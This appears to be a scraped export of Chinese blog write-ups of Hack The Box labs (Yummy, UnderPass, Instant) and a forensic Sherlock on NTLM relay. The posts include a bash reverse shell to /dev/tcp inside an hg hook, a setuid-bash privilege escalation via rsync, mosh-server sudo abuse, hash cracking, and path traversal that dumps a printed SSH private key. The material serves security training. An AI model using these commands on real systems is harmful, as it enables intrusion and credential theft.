.hgrc\r# example user config (see \u0026#39;hg help config\u0026#39; for more info)\r[ui]\r# name and email, e.g.\r# username = Jane Doe \u0026lt;jdoe@example.com\u0026gt;\rusername = qa\r.....\r.....\r[trusted]\rusers = qa, dev\rgroups = qa, dev 可以添加一个hook，让执行完pull命令后自动执行一个脚本\n[trusted]\rusers = qa, dev\rgroups = qa, dev\r#add this\r[hooks]\rpost-pull = /tmp/shell.sh shell.sh的内容是：bash -c 'bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.xx.xx/500 0\u0026gt;\u0026amp;1'\n完整命令如下\nqa@yummy:/tmp$ cd /tmp;mkdir .hg;chmod 777 .hg;cp /home/qa/.hgrc /tmp/.hg/hgrc\rqa@yummy:/tmp$ sudo -u dev /usr/bin/hg pull /home/dev/app-production/ 查看dev的命令权限\ndev@yummy:/tmp$ sudo -l\rsudo -l\rMatching Defaults entries for dev on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser dev may run the following commands on localhost:\r(root : root) NOPASSWD: /usr/bin/rsync -a --exclude\\=.hg /home/dev/app-production/* /opt/app/ 这条命令使用 rsync 将 /home/dev/app-production/ 目录下的所有文件（排除 .hg 目录）同步到 /opt/app/ 目录。\nrsync有一个参数--chown改变文件或目录的所有者和所属组。\n先将bash赋值进app-production目录\ndev@yummy:~$ cp /bin/bash /home/dev/app-production/bash 然后设置bash的启动方式以文件的拥有者身份运行，而不是当前用户的身份\ndev@yummy:~/app-production$ chmod u+s /home/dev/app-production/bash 然后通过chown修改/opt/app目录为root的拥有权限\ndev@yummy:~$ sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/* --chown root:root /opt/app/ 然后/opt/app目录下开启一个新的bash\nSummary #\rUser：下载链接存在任意文件下载，通过定时任务可以看到存在定时备份，泄露出网站目录下的备份文件名称。身份验证使用的是JWT，在JWT Payload的中泄露了RSA加密的参数，并且在备份源码中也发现了加密方式，修改脚本生成Administrator的JWT Token。进入到了Admindashboard，通过源码可知在order by处存在报错注入，没有可以读取的数据，可以写入一个文件通过定时任务执行反弹Shell，获取到qa用户。\nRoot：qa用户的特殊权限的命令中，可以写入hg的配置钩子，让执行完Pull命令后自动执行脚本，反弹得到dev的Shell。在dev的特殊权限的命令中可以修改文件或者目录的所有者，因此可以通过修改bash的所有者和启动方式，以root的身份启动bash。\n","date":"2024-12-24","externalUrl":null,"permalink":"/posts/2024/12/htb-yummy/","section":"Posts","summary":"","title":"HTB-Yummy","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Easy Nmap #\r[root@kali] /home/kali/UnderPass ❯ nmap underpass.htb -sSCV -Pn -T4 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 11:26 CST\rNmap scan report for underpass.htb (10.10.11.48)\rHost is up (0.12s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)\r|_ 256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)\r80/tcp open http Apache httpd 2.4.52 ((Ubuntu))\r|_http-server-header: Apache/2.4.52 (Ubuntu)\r|_http-title: Apache2 Ubuntu Default Page: It works\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 22.04 seconds TCP开放端口：22、80\n尝试进行UDP端口扫描\n[root@kali] /home/kali/UnderPass ❯ nmap -sU underpass.htb -T5 ⏎\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-22 12:50 CST\rWarning: 10.10.11.48 giving up on port because retransmission cap hit (2).\rNmap scan report for underpass.htb (10.10.11.48)\rHost is up (0.073s latency).\rNot shown: 897 open|filtered udp ports (no-response), 102 closed udp ports (port-unreach)\rPORT STATE SERVICE\r161/udp open snmp\rNmap done: 1 IP address (1 host up) scanned in 100.11 seconds UDP开放端口：161，并且可以看到有个SNMP的服务开启\nSNMP叫做简单网络管理协议，他的通信走的是UDP的161、162。SNMP的服务端，也就是信息被查询的被管理端使用的是UDP的161端口，客户端使用的是162端口。\nSNMP-check #\r[root@kali] /home/kali/UnderPass ❯ snmp-check 10.10.11.48 snmp-check v1.9 - SNMP enumerator\rCopyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)\r[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community \u0026#39;public\u0026#39;\r[*] System information:\rHost IP address : 10.10.11.48\rHostname : UnDerPass.htb is the only daloradius server in the basin!\rDescription : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64\rContact : steve@underpass.htb\rLocation : Nevada, U.S.A. but not Vegas\rUptime snmp : 00:46:13.58\rUptime system : 00:46:04.37\rSystem date : 2024-12-22 04:39:09.0 可以看到有steve@underpass.htb的用户名，并且存在一个daloradius的服务\n在其Github中我发现了一个可能存在的路径/var/www/daloradius\ndaloradius/Dockerfile at master · lirantal/daloradius (github.com) Dirsearch #\r[root@kali] /home/kali/UnderPass ❯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/\u0026#34; -t 50 ⏎\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius__24-12-22_12-58-34.txt\rTarget: http://underpass.htb/\r[12:58:34] Starting: daloradius/ [12:58:39] 200 - 221B - /daloradius/.gitignore [12:58:47] 301 - 323B - /daloradius/app -\u0026gt; http://underpass.htb/daloradius/app/\r[12:58:49] 200 - 24KB - /daloradius/ChangeLog [12:58:51] 301 - 323B - /daloradius/doc -\u0026gt; http://underpass.htb/daloradius/doc/\r[12:58:51] 200 - 2KB - /daloradius/docker-compose.yml\r[12:58:51] 200 - 2KB - /daloradius/Dockerfile [12:58:57] 301 - 327B - /daloradius/library -\u0026gt; http://underpass.htb/daloradius/library/\r[12:58:57] 200 - 18KB - /daloradius/LICENSE [12:59:04] 200 - 10KB - /daloradius/README.md [12:59:05] 301 - 325B - /daloradius/setup -\u0026gt; http://underpass.htb/daloradius/setup/\rTask Completed 查看他的docker-compose.yml\nversion: \u0026#34;3\u0026#34;\rservices:\rradius-mysql:\rimage: mariadb:10\rcontainer_name: radius-mysql\rrestart: unless-stopped\renvironment:\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r- MYSQL_ROOT_PASSWORD=radiusrootdbpw\rvolumes:\r- \u0026#34;./data/mysql:/var/lib/mysql\u0026#34;\rradius:\rcontainer_name: radius\rbuild:\rcontext: .\rdockerfile: Dockerfile-freeradius\rrestart: unless-stopped\rdepends_on: - radius-mysql\rports:\r- \u0026#39;1812:1812/udp\u0026#39;\r- \u0026#39;1813:1813/udp\u0026#39;\renvironment:\r- MYSQL_HOST=radius-mysql\r- MYSQL_PORT=3306\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r# Optional settings\r- DEFAULT_CLIENT_SECRET=testing123\rvolumes:\r- ./data/freeradius:/data\r# If you want to disable debug output, remove the command parameter\rcommand: -X\rradius-web:\rbuild: .\rcontainer_name: radius-web\rrestart: unless-stopped\rdepends_on:\r- radius\r- radius-mysql\rports:\r- \u0026#39;80:80\u0026#39;\r- \u0026#39;8000:8000\u0026#39;\renvironment:\r- MYSQL_HOST=radius-mysql\r- MYSQL_PORT=3306\r- MYSQL_DATABASE=radius\r- MYSQL_USER=radius\r- MYSQL_PASSWORD=radiusdbpw\r# Optional Settings:\r- DEFAULT_CLIENT_SECRET=testing123\r- DEFAULT_FREERADIUS_SERVER=radius\r- MAIL_SMTPADDR=127.0.0.1\r- MAIL_PORT=25\r- MAIL_FROM=root@daloradius.xdsl.by\r- MAIL_AUTH=\rvolumes:\r- ./data/daloradius:/data 可以看到存在一些环境信息environment\n对app目录再次进行扫描，得到login.php\n[root@kali] /home/kali/UnderPass ❯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/app/\u0026#34; -t 50\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius_app__24-12-22_15-38-14.txt\rTarget: http://underpass.htb/\r[15:38:14] Starting: daloradius/app/ [15:38:28] 301 - 330B - /daloradius/app/common -\u0026gt; http://underpass.htb/daloradius/app/common/\r[15:38:47] 301 - 329B - /daloradius/app/users -\u0026gt; http://underpass.htb/daloradius/app/users/\r[15:38:47] 302 - 0B - /daloradius/app/users/ -\u0026gt; home-main.php [15:38:47] 200 - 2KB - /daloradius/app/users/login.php Task Completed 然后我在/daloradius/doc/install/INSTALL里发现了版本信息以及默认的用户名密码\nusername: administrator\rpassword: radius 由于无法直接从/app/user进行登录，尝试对/app目录进行更全面的扫描，就不用默认的字典了\n[root@kali] /home/kali/UnderPass ❯ dirsearch -u \u0026#34;http://underpass.htb/daloradius/app/\u0026#34; -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 220545\rOutput File: /home/kali/UnderPass/reports/http_underpass.htb/_daloradius_app__24-12-22_16-13-23.txt\rTarget: http://underpass.htb/\r[16:13:23] Starting: daloradius/app/ [16:13:24] 301 - 330B - /daloradius/app/common -\u0026gt; http://underpass.htb/daloradius/app/common/\r[16:13:24] 301 - 329B - /daloradius/app/users -\u0026gt; http://underpass.htb/daloradius/app/users/\r[16:13:37] 301 - 333B - /daloradius/app/operators -\u0026gt; http://underpass.htb/daloradius/app/operators/\rTask Completed 从/app/operators使用默认的密码即可登录到后台\nMD5 Crack #\r在用户列表中发现Password的MD5值\n使用John the Ripper，进行爆破\n[root@kali] /home/kali/UnderPass ❯ john md5.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5\rUsing default input encoding: UTF-8\rLoaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])\rWarning: no OpenMP support for this hash type, consider --fork=4\rPress \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status\runderwaterfriends (?) 1g 0:00:00:00 DONE (2024-12-22 16:34) 8.333g/s 24865Kp/s 24865Kc/s 24865KC/s undiamecaiQ..underthecola\rUse the \u0026#34;--show --format=Raw-MD5\u0026#34; options to display all of the cracked passwords reliably\rSession completed. ssh登录拿到user.txt\nPrivilege Escalation #\r在数据库中没有找到有价值的东西，上传Linpeas，发现一个特殊权限的命令\n╔══════════╣ Permissions in init, init.d, systemd, and rc.d\r╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d You have write privileges over /etc/init.d/moshserver The following files aren\u0026#39;t owned by root: /etc/init.d/moshserver\rsvcMosh@underpass:/var/www/html/daloradius/app/operators$ sudo -l\rMatching Defaults entries for svcMosh on localhost:\renv_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\rUser svcMosh may run the following commands on localhost:\r(ALL) NOPASSWD: /usr/bin/mosh-server 可以看到--server这个参数命令默认是mosh-server，而当前用户所具有的超级权限的命令也是这个\n因此可以通过这个参数连接到自己\nsvcMosh@underpass:/tmp$ mosh --server=\u0026#34;sudo /usr/bin/mosh-server\u0026#34; localhost Summary #\rUser：在这个machine中，了解到了端口扫描不只是TCP，有的服务默认开在UDP端口上，通过更全面的路径扫描得到网站的默认用户名密码，然后用户列表信息泄露进行SSH登录。\nRoot：用户所具有的超级权限的命令作为mosh-server的启动项，进而获取到Root的权限。\n","date":"2024-12-22","externalUrl":null,"permalink":"/posts/2024/12/htb-underpass/","section":"Posts","summary":"","title":"HTB-UnderPass","type":"posts"},{"content":"\rSherlock Scenario #\r我们的SIEM提醒我们注意一个需要立即查看的可疑登录事件。警报详细信息是IP地址和源工作站名称不匹配。您将收到事件时间范围内周围时间的网络捕获和事件日志。对给定的证据进行核化，并向SOC经理报告。\nNTLM Relay Attack #\r这是Hackthebox的官方链接：NTLM 中继攻击检测 (hackthebox.com)\nLLMNR（Link-Local Multicast Name Resolution）是一种用于在局域网中解析主机名的协议，类似于 DNS，但主要用于没有 DNS服务器的网络环境。LLMNR允许设备通过广播请求解析局域网内其他设备的名称。\nLLMNR中毒攻击（LLMNR Poisoning Attack）是通过伪造 LLMNR响应来诱导目标设备接受攻击者控制的 IP地址的攻击手段。其具体过程如下\n攻击者监听 LLMNR 请求：攻击者在局域网内监听 LLMNR 请求。当目标设备发出 LLMNR 请求时，攻击者能够捕获到该请求。\n伪造 LLMNR 响应：攻击者伪造一个 LLMNR 响应，回应目标设备所请求的主机名，且将该主机名解析为攻击者自己的 IP 地址。\n目标设备信任伪造响应：如果目标设备没有进行适当的验证（如 DNSSEC 等），它可能会将攻击者的 IP 地址作为请求的目标设备，从而可能导致NTLM凭证被窃取\nLLMNR中毒攻击常见于 Windows环境，因为 Windows默认启用了 LLMNR协议，这使得 Windows主机容易受到该类型攻击。\n当攻击者使用 LLMNR中毒攻击拦截网络流量时，他们可以进一步尝试中继拦截的事件，以代表受害者向特定服务验证自己。\nTask 1\u0026amp;2 #\rWhat is the IP Address for Forela-Wkstn001 and Forela-Wkstn002?\n在Wireshark中添加nbns过滤器可以得到几个IP source\nForela-Wkstn001被分配给了172.17.79.129\nForela-Wkstn002被分配给了172.17.79.136\n172.17.79.135似乎是一个未知设备\nTask3 #\rWhat is the username of the account whose hash was stolen by attacker?\n针对这个位置设备进行查看\nip.addr == 172.17.79.135 \u0026amp;\u0026amp; smb2 可以发现135这台机器使用NTLM登录了用户名为：arthur.kyle的账户\nTask4 #\rWhat is the IP Address of Unknown Device used by the attacker to intercept credentials?\n从Task3中可以看到IPsource为172.17.73.135的主机\nTask5 #\rWhat was the fileshare navigated by the victim user account?\n在Security.evtx的Logon事件中可以找到\n已成功登录帐户。\r使用者:\r安全 ID:\tNULL SID\r帐户名称:\t-\r帐户域:\t-\r登录 ID:\t0x0\r登录信息:\r登录类型:\t3\r受限制的管理员模式:\t-\r虚拟帐户:\t否\r提升的令牌:\t否\r模拟级别:\t模拟\r新登录:\r安全 ID:\tS-1-5-21-3239415629-1862073780-2394361899-1601\r帐户名称:\tarthur.kyle\r帐户域:\tFORELA\r登录 ID:\t0x64A799\r链接的登录 ID:\t0x0\r网络帐户名称:\t-\r网络帐户域:\t-\r登录 GUID:\t{00000000-0000-0000-0000-000000000000}\r进程信息:\r进程 ID:\t0x0\r进程名称:\t-\r网络信息:\r工作站名称:\tFORELA-WKSTN002\r源网络地址:\t172.17.79.135\r源端口:\t40252\r详细的身份验证信息:\r登录进程:\tNtLmSsp 身份验证数据包:\tNTLM\r传递的服务:\t-\r数据包名(仅限 NTLM):\tNTLM V2\r密钥长度:\t128 可以看到攻击者通过截获的NTLM登录了FORELA-WKSTN002（172.17.79.136）\n将过滤器修改为这样👇\nip.addr == 172.17.79.136 \u0026amp;\u0026amp; smb2 可以看见共享文件是：\\\\DC01\\Trip\nTask6 #\rWhat is the source port used to logon to target workstation using the compromised account?\n在Task5中的事件详细中可以看到使用的登陆端口是40252\nTask7 #\rWhat is the Logon ID for the malicious session?\n事件详细中的登录ID\nTask8 #\rThe detection was based on the mismatch of hostname and the assigned IP Address.What is the workstation name and the source IP Address from which the malicious logon occur?\n检测是基于工作站名和IP地址不匹配，还是根据Logon事件分析\n002的IP地址在nbns协议中的IP地址是172.17.79.136，而在登录事件中可以看到源网络地址是172.17.79.135。\nTask9 #\rAt what UTC time did the the malicious logon happen?\n需要进入详细信息才能查看到，外面的时间是日志导出的时间，内部Timecreated才是真正发生的时间\nTask10 #\rWhat is the share Name accessed as part of the authentication process by the malicious tool used by the attacker?\n在事件ID为5140的事件中发现共享文件名\n","date":"2024-12-21","externalUrl":null,"permalink":"/posts/2024/12/sherlocks-reaper/","section":"Posts","summary":"","title":"Sherlocks-Reaper","type":"posts"},{"content":"\rBox Info #\rOS Linux Difficulty Medium Nmap #\r[root@kali] /home/kali/Instant ❯ nmap instant.htb -sSCV -Pn -T4\rStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-20 11:39 CST\rNmap scan report for instant.htb (10.10.11.37)\rHost is up (0.097s latency).\rNot shown: 998 closed tcp ports (reset)\rPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)\r| ssh-hostkey: | 256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)\r|_ 256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)\r80/tcp open http Apache httpd 2.4.58\r|_http-title: Instant Wallet\r|_http-server-header: Apache/2.4.58 (Ubuntu)\rService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\rService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\rNmap done: 1 IP address (1 host up) scanned in 11.72 seconds 开放端口：22、80\nAnalyze APK #\r在网页中可以下载APK安装包\n将其下载，我这里使用的是kali里面的apktool\n[root@kali] /home/kali/Instant/ ❯ apktool d instant.apk 在network_security_config.xml发现子域名\n[root@kali] /home/kali/Instant/instant/res/xml ❯ cat network_security_config.xml \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34;?\u0026gt;\r\u0026lt;network-security-config\u0026gt;\r\u0026lt;domain-config cleartextTrafficPermitted=\u0026#34;true\u0026#34;\u0026gt;\r\u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;mywalletv1.instant.htb\u0026lt;/domain\u0026gt;\r\u0026lt;domain includeSubdomains=\u0026#34;true\u0026#34;\u0026gt;swagger-ui.instant.htb\u0026lt;/domain\u0026gt;\r\u0026lt;/domain-config\u0026gt;\r\u0026lt;/network-security-config\u0026gt;# 添加到/etc/hosts\nDirsearch #\r[root@kali] /home/kali/Instant ❯ dirsearch -u \u0026#34;swagger-ui.instant.htb\u0026#34; -t 50 ⏎\r/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html\rfrom pkg_resources import DistributionNotFound, VersionConflict\r_|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460\rOutput File: /home/kali/Instant/reports/_swagger-ui.instant.htb/_24-12-20_15-21-03.txt\rTarget: http://swagger-ui.instant.htb/\r[15:21:03] Starting: [15:21:18] 308 - 263B - /apidocs -\u0026gt; http://swagger-ui.instant.htb/apidocs/\r[15:21:36] 403 - 287B - /server-status [15:21:36] 403 - 287B - /server-status/ Task Completed JWT token #\r进入apidocs目录查看\n可以先注册一个用户试一下\ncurl -X POST \u0026#34;http://swagger-ui.instant.htb/api/v1/register\u0026#34; -H \u0026#34;accept: application/json\u0026#34; -H \u0026#34;Content-Type: application/json\u0026#34; -d \u0026#34;{ \\\u0026#34;email\\\u0026#34;: \\\u0026#34;string\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;hyh\\\u0026#34;, \\\u0026#34;pin\\\u0026#34;: \\\u0026#34;12121\\\u0026#34;, \\\u0026#34;username\\\u0026#34;: \\\u0026#34;hyh\\\u0026#34;}\u0026#34; {\r\u0026#34;Access-Token\u0026#34;: \u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6NCwicm9sZSI6Imluc3RhbnRpYW4iLCJ3YWxJZCI6IjQ5ZmU0MjlkLTcwYzMtNGU2MC1iMDcxLTc3MDZkNjQ2MmI0NSIsImV4cCI6MTczNDcxMDYwMX0.TXTuplRyzyru23WdofFve33S7FiLgfs34_P4gXgbOcU\u0026#34;,\r\u0026#34;Status\u0026#34;: 201\r}\r#Jwt decode\r{\r\u0026#34;id\u0026#34;: 4,\r\u0026#34;role\u0026#34;: \u0026#34;instantian\u0026#34;,\r\u0026#34;walId\u0026#34;: \u0026#34;49fe429d-70c3-4e60-b071-7706d6462b45\u0026#34;,\r\u0026#34;exp\u0026#34;: 1734710601\r} 可以看到当前用户是一个普通用户，而其他的功能需要Admin的token才能使用，当前思路就是去apk的源文件里找类似于token或key的值\n似乎在这个地方存在一个测试函数👇\n读取那个文件，找到了一个存在的token，并且用户是admin\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA\r#jwt decode\r{\r\u0026#34;id\u0026#34;: 1,\r\u0026#34;role\u0026#34;: \u0026#34;Admin\u0026#34;,\r\u0026#34;walId\u0026#34;: \u0026#34;f0eca6e5-783a-471d-9d8f-0162cbc900db\u0026#34;,\r\u0026#34;exp\u0026#34;: 33259303656\r} 保存token到网页中\n使用/api/v1/admin/read/log的功能，尝试进行任意文件读取，可以看到成功读取到了/etc/passwd\n我在网页标题下面的那个Json文件中发现了泄露的用户名：shirohige\n因此尝试读取他的ssh私钥内容\n../../../../../../../home/shirohige/.ssh/id_rsa\r{\r\u0026#34;/home/shirohige/logs/../../../../../../../home/shirohige/.ssh/id_rsa\u0026#34;: [\r\u0026#34;-----BEGIN OPENSSH PRIVATE KEY-----\\n\u0026#34;,\r\u0026#34;b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\\n\u0026#34;,\r\u0026#34;NhAAAAAwEAAQAAAYEApbntlalmnZWcTVZ0skIN2+Ppqr4xjYgIrZyZzd9YtJGuv/w3GW8B\\n\u0026#34;,\r\u0026#34;nwQ1vzh3BDyxhL3WLA3jPnkbB8j4luRrOfHNjK8lGefOMYtY/T5hE0VeHv73uEOA/BoeaH\\n\u0026#34;,\r\u0026#34;dAGhQuAAsDj8Avy1yQMZDV31PHcGEDu/0dU9jGmhjXfS70gfebpII3js9OmKXQAFc2T5k/\\n\u0026#34;,\r\u0026#34;5xL+1MHnZBiQqKvjbphueqpy9gDadsiAvKtOA8I6hpDDLZalak9Rgi+BsFvBsnz244uCBY\\n\u0026#34;,\r\u0026#34;8juWZrzme8TG5Np6KIg1tdZ1cqRL7lNVMgo7AdwQCVrUhBxKvTEJmIzR/4o+/w9njJ3+WF\\n\u0026#34;,\r\u0026#34;uaMbBzOsNCAnXb1Mk0ak42gNLqcrYmupUepN1QuZPL7xAbDNYK2OCMxws3rFPHgjhbqWPS\\n\u0026#34;,\r\u0026#34;jBlC7kaBZFqbUOA57SZPqJY9+F0jttWqxLxr5rtL15JNaG+rDfkRmmMzbGryCRiwPc//AF\\n\u0026#34;,\r\u0026#34;Oq8vzE9XjiXZ2P/jJ/EXahuaL9A2Zf9YMLabUgGDAAAFiKxBZXusQWV7AAAAB3NzaC1yc2\\n\u0026#34;,\r\u0026#34;EAAAGBAKW57ZWpZp2VnE1WdLJCDdvj6aq+MY2ICK2cmc3fWLSRrr/8NxlvAZ8ENb84dwQ8\\n\u0026#34;,\r\u0026#34;sYS91iwN4z55GwfI+JbkaznxzYyvJRnnzjGLWP0+YRNFXh7+97hDgPwaHmh3QBoULgALA4\\n\u0026#34;,\r\u0026#34;/AL8tckDGQ1d9Tx3BhA7v9HVPYxpoY130u9IH3m6SCN47PTpil0ABXNk+ZP+cS/tTB52QY\\n\u0026#34;,\r\u0026#34;kKir426YbnqqcvYA2nbIgLyrTgPCOoaQwy2WpWpPUYIvgbBbwbJ89uOLggWPI7lma85nvE\\n\u0026#34;,\r\u0026#34;xuTaeiiINbXWdXKkS+5TVTIKOwHcEAla1IQcSr0xCZiM0f+KPv8PZ4yd/lhbmjGwczrDQg\\n\u0026#34;,\r\u0026#34;J129TJNGpONoDS6nK2JrqVHqTdULmTy+8QGwzWCtjgjMcLN6xTx4I4W6lj0owZQu5GgWRa\\n\u0026#34;,\r\u0026#34;m1DgOe0mT6iWPfhdI7bVqsS8a+a7S9eSTWhvqw35EZpjM2xq8gkYsD3P/wBTqvL8xPV44l\\n\u0026#34;,\r\u0026#34;2dj/4yfxF2obmi/QNmX/WDC2m1IBgwAAAAMBAAEAAAGARudITbq/S3aB+9icbtOx6D0XcN\\n\u0026#34;,\r\u0026#34;SUkM/9noGckCcZZY/aqwr2a+xBTk5XzGsVCHwLGxa5NfnvGoBn3ynNqYkqkwzv+1vHzNCP\\n\u0026#34;,\r\u0026#34;OEU9GoQAtmT8QtilFXHUEof+MIWsqDuv/pa3vF3mVORSUNJ9nmHStzLajShazs+1EKLGNy\\n\u0026#34;,\r\u0026#34;nKtHxCW9zWdkQdhVOTrUGi2+VeILfQzSf0nq+f3HpGAMA4rESWkMeGsEFSSuYjp5oGviHb\\n\u0026#34;,\r\u0026#34;T3rfZJ9w6Pj4TILFWV769TnyxWhUHcnXoTX90Tf+rAZgSNJm0I0fplb0dotXxpvWtjTe9y\\n\u0026#34;,\r\u0026#34;1Vr6kD/aH2rqSHE1lbO6qBoAdiyycUAajZFbtHsvI5u2SqLvsJR5AhOkDZw2uO7XS0sE/0\\n\u0026#34;,\r\u0026#34;cadJY1PEq0+Q7X7WeAqY+juyXDwVDKbA0PzIq66Ynnwmu0d2iQkLHdxh/Wa5pfuEyreDqA\\n\u0026#34;,\r\u0026#34;wDjMz7oh0APgkznURGnF66jmdE7e9pSV1wiMpgsdJ3UIGm6d/cFwx8I4odzDh+1jRRAAAA\\n\u0026#34;,\r\u0026#34;wQCMDTZMyD8WuHpXgcsREvTFTGskIQOuY0NeJz3yOHuiGEdJu227BHP3Q0CRjjHC74fN18\\n\u0026#34;,\r\u0026#34;nB8V1c1FJ03Bj9KKJZAsX+nDFSTLxUOy7/T39Fy45/mzA1bjbgRfbhheclGqcOW2ZgpgCK\\n\u0026#34;,\r\u0026#34;gzGrFox3onf+N5Dl0Xc9FWdjQFcJi5KKpP/0RNsjoXzU2xVeHi4EGoO+6VW2patq2sblVt\\n\u0026#34;,\r\u0026#34;pErOwUa/cKVlTdoUmIyeqqtOHCv6QmtI3kylhahrQw0rcbkSgAAADBAOAK8JrksZjy4MJh\\n\u0026#34;,\r\u0026#34;HSsLq1bCQ6nSP+hJXXjlm0FYcC4jLHbDoYWSilg96D1n1kyALvWrNDH9m7RMtS5WzBM3FX\\n\u0026#34;,\r\u0026#34;zKCwZBxrcPuU0raNkO1haQlupCCGGI5adMLuvefvthMxYxoAPrppptXR+g4uimwp1oJcO5\\n\u0026#34;,\r\u0026#34;SSYSPxMLojS9gg++Jv8IuFHerxoTwr1eY8d3smeOBc62yz3tIYBwSe/L1nIY6nBT57DOOY\\n\u0026#34;,\r\u0026#34;CGGElC1cS7pOg/XaOh1bPMaJ4Hi3HUWwAAAMEAvV2Gzd98tSB92CSKct+eFqcX2se5UiJZ\\n\u0026#34;,\r\u0026#34;n90GYFZoYuRerYOQjdGOOCJ4D/SkIpv0qqPQNulejh7DuHKiohmK8S59uMPMzgzQ4BRW0G\\n\u0026#34;,\r\u0026#34;HwDs1CAcoWDnh7yhGK6lZM3950r1A/RPwt9FcvWfEoQqwvCV37L7YJJ7rDWlTa06qHMRMP\\n\u0026#34;,\r\u0026#34;5VNy/4CNnMdXALx0OMVNNoY1wPTAb0x/Pgvm24KcQn/7WCms865is11BwYYPaig5F5Zo1r\\n\u0026#34;,\r\u0026#34;bhd6Uh7ofGRW/5AAAAEXNoaXJvaGlnZUBpbnN0YW50AQ==\\n\u0026#34;,\r\u0026#34;-----END OPENSSH PRIVATE KEY-----\\n\u0026#34;\r],\r\u0026#34;Status\u0026#34;: 201\r} 格式化一下之后，把密钥的权限设置为600，然后使用ssh登录即可获取到User\nPrivilege Escalation #\r发现一个数据库文件\n因为没有nc，那么使用scp进行远程下载文件\n[root@kali] /home/kali/Instant ❯ scp -i shirohige_key shirohige@instant.htb:/home/shirohige/projects/mywallet/Instant-Api/mywallet/instance/instant.db ./ 得到admin的密码hash\npbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978 